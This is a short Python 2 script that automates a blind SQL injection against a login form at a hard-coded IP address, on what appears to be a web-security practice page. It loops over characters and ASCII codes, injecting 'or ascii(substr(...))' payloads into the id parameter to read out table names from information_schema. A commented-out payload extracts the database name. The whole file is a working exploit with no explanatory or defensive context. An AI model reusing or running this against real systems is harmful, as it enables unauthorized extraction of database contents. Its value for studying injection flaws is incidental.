#-*- coding: utf-8 -*-
import requests
import sys

url = "http://203.229.206.22/~wing608/webstudy/att/04/blind.php"
#for num3 in range (1,20) : 
num3 =2 
print str(num3)+"'s table : ",
for num2 in range(1,20) : 
    #print str(num2)+"'s char : ",
    for num in range(48,122) : 
        #payload = "' or ascii(substr((select database()),"+str(num2)+",1))="+str(num)+"#"
        payload = "' or ascii(substr((select table_name from information_schema.tables limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+"#"
        data = {"id" : payload,"login":"로그인"}
    
        res = requests.get(url,params=data)
       #print payload,
        #print num,res.text
        
        if "Login Ok!" in res.text : 
            print chr(num),
      #db name = blindsql